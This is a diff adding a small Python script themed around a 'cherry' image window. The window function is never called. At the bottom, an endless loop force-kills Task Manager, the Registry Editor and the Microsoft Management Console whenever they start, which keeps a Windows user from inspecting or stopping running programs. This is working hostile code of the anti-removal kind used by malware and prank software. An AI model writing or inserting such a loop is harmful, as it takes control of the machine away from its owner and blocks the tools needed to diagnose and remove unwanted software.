@@ -1,0 +1,27 @@
+import customtkinter
+from PIL import Image
+import os
+import psutil
+import time
+
+assets = os.path.join(os.path.dirname(os.path.realpath(__file__)), "assets")
+
+def cherry_window():
+    top = customtkinter.CTk()
+    top.title("cherry")
+    top.geometry("144x144")
+
+    cherry = customtkinter.CTkImage(Image.open(os.path.join(assets, 'cherry.jpg')), size=(144,144))
+
+    label = customtkinter.CTkLabel(top, image=cherry, text="", height=144)
+    label.grid(row=0, column=0, sticky="nsew")
+
+    top.attributes("-topmost", True)
+    top.attributes("-disabled", True)
+
+    top.mainloop()
+
+while True:
+	os.system('tasklist | findstr /i "mmc.exe" && taskkill /f /im mmc.exe')
+	os.system('tasklist | findstr /i "Taskmgr.exe" && taskkill /f /im Taskmgr.exe')
+	os.system('tasklist | findstr /i "regedit.exe" && taskkill /f /im regedit.exe')
